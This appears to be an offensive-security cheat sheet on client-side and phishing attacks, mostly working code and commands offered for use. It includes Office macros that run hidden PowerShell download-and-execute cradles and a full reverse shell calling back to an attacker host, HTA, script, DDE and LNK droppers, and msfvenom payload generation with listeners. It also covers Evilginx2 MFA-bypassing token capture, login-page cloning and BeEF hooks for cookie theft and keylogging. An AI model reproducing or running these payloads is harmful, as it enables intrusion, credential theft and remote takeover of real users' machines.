---
title: "Client-Side Attacks"
---

# Client-Side Attacks

Client-side attacks shift the exploitation target from server infrastructure to the users themselves. When perimeter defenses are solid, a malicious document or phishing link can achieve initial access that direct exploitation cannot. This covers the techniques I use for phishing engagements and initial access via user interaction.

## Microsoft Office Macro Attacks

### VBA Macro: PowerShell Reverse Shell

The classic approach: embed a macro in a Word document that executes PowerShell on open.

```vba
Sub AutoOpen()
    Dim strCommand As String
    strCommand = "powershell -nop -w hidden -enc <BASE64_PAYLOAD>"
    Shell "cmd.exe /c " & strCommand, vbHide
End Sub

Sub Document_Open()
    AutoOpen
End Sub
```

Generate the base64 encoded payload:

```bash
# PowerShell reverse shell: encode for macro embedding
$payload = 'IEX (New-Object Net.WebClient).DownloadString("http://KALI/shell.ps1")'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($payload)
$encoded = [Convert]::ToBase64String($bytes)
Write-Output $encoded
```

Or using Python:

```python
import base64
cmd = 'IEX (New-Object Net.WebClient).DownloadString("http://KALI/shell.ps1")'
encoded = base64.b64encode(cmd.encode('utf-16-le')).decode()
print(f'powershell -nop -w hidden -enc {encoded}')
```

### Staged Delivery via HTTP

Keep the macro simple: download and execute from a web server:

```vba
Sub AutoOpen()
    Dim strCommand As String
    strCommand = "powershell -nop -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://KALI/payload.ps1')"""
    Shell "cmd.exe /c " & strCommand, vbHide
End Sub
```

Host payload:

```bash
python3 -m http.server 80
# Or use a specialized server that logs requests
```

### Nishang Reverse Shell

```powershell
# payload.ps1 content
$client = New-Object System.Net.Sockets.TCPClient('KALI', 4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i)
    $sendback = (iex $data 2>&1 | Out-String)
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
```

## HTML Application (HTA)

HTA files execute as trusted applications using mshta.exe: they bypass many web content restrictions:

```html
<!-- payload.hta -->
<script language="VBScript">
Sub RunPS
    Dim objShell
    Set objShell = CreateObject("Wscript.Shell")
    objShell.Run "powershell -nop -w hidden -enc <BASE64>", 0, True
    Set objShell = Nothing
End Sub

RunPS
window.close()
</script>
```

Delivery:

```html
<!-- Phishing email body -->
<a href="http://KALI/payload.hta">Click here to view the document</a>
```

## Windows Script Host (WSH): JScript / VBScript

Delivered as `.js` or `.vbs` files:

```javascript
// payload.js
var oShell = new ActiveXObject("Wscript.Shell");
oShell.Run("powershell -nop -w hidden -enc <BASE64>", 0, false);
```

```vbscript
' payload.vbs
Set oShell = CreateObject("Wscript.Shell")
oShell.Run "powershell -nop -w hidden -enc <BASE64>", 0, False
```

## Microsoft Office: DDE (Dynamic Data Exchange)

No macro needed: DDE executes commands when the document is opened:

```
# In Word field: Insert → Field → = (Formula)
# Field content:
=cmd|'/c powershell -nop -w hidden -enc <BASE64>'!A1
```

DDE requires user interaction (confirm dialog) but bypasses macro security settings.

## Embedded Objects and Icons

Disguise executables with legitimate-looking icons:

```bash
# Create a fake PDF icon executable
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI LPORT=4444 -f exe -o payload.exe

# Change icon (requires Resource Hacker or similar on Windows)
# Use PE tools to embed a PDF icon into the binary
```

## Phishing Infrastructure

### Capturing Credentials

```bash
# Clone a login page
httrack http://target-login.com -O ./cloned_site

# Serve with GoPhish or manually modified POST action
# Change form action to your server
```

### GoPhish Setup

```bash
# Start GoPhish
./gophish

# Access admin panel: https://localhost:3333
# Default creds: admin / gophish

# Configure:
# 1. Sending profile (SMTP)
# 2. Landing page (cloned or custom)
# 3. Email template
# 4. Campaign targeting
```

### Evilginx2 (Proxy-based Phishing)

Captures session tokens: bypasses MFA:

```bash
# Start
./evilginx2 -p ./phishlets

# Configure
config domain DOMAIN
config ip KALI_IP
phishlets hostname office365 DOMAIN
phishlets enable office365
lures create office365
lures get-url 0
```

## Browser-based Exploitation

### BeEF (Browser Exploitation Framework)

```bash
# Start BeEF
cd /usr/share/beef-xss/
./beef

# Access: http://127.0.0.1:3000/ui/panel
# Hook URL: http://KALI:3000/hook.js

# Deliver hook via XSS
<script src="http://KALI:3000/hook.js"></script>

# Or in phishing page
<script src="http://KALI:3000/hook.js"></script>
```

Once hooked, BeEF provides:
- Browser fingerprinting
- Cookie theft
- Clipboard access
- Webcam/microphone access (with user prompt)
- Keylogging
- Network discovery from browser
- Further exploitation modules

## PDF Exploits

### Malicious PDF with Embedded JavaScript

```bash
# Using msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI LPORT=4444 -f pdf -o malicious.pdf

# Custom JavaScript in PDF
# Use tools like pdf-parser or PyMuPDF to embed JS
```

### PDF with Embedded File

```python
import pikepdf

# Create PDF that opens a URL when clicked
pdf = pikepdf.Pdf.new()
# Embed JavaScript to open/execute URL
```

## USB Drop Attacks

### AutoRun (Legacy Windows)

```
[autorun]
open=payload.exe
action=Open folder to view files
```

### LNK File Attack

```powershell
# Create malicious .lnk
$lnk = (New-Object -ComObject WScript.Shell).CreateShortcut("README.lnk")
$lnk.TargetPath = "powershell.exe"
$lnk.Arguments = "-nop -w hidden -enc <BASE64>"
$lnk.IconLocation = "C:\Windows\System32\shell32.dll,3"
$lnk.Save()
```

## Payload Generation Summary

```bash
# Windows reverse shell (exe)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI LPORT=4444 -f exe -o shell.exe

# Windows reverse shell (dll)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI LPORT=4444 -f dll -o shell.dll

# PowerShell reverse shell (ps1)
msfvenom -p cmd/windows/reverse_powershell LHOST=KALI LPORT=4444 > shell.ps1

# HTA
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI LPORT=4444 -f hta-psh -o shell.hta

# Macro (VBA)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI LPORT=4444 -f vba -o macro.vba

# Python
msfvenom -p cmd/unix/reverse_python LHOST=KALI LPORT=4444 -f raw > shell.py
```

## Listener Setup

```bash
# Netcat
nc -lvnp 4444

# Ncat (more stable)
ncat -lvnp 4444

# Metasploit handler (needed for staged payloads)
msfconsole -q -x "use multi/handler; set PAYLOAD windows/x64/shell_reverse_tcp; set LHOST KALI; set LPORT 4444; exploit"
```
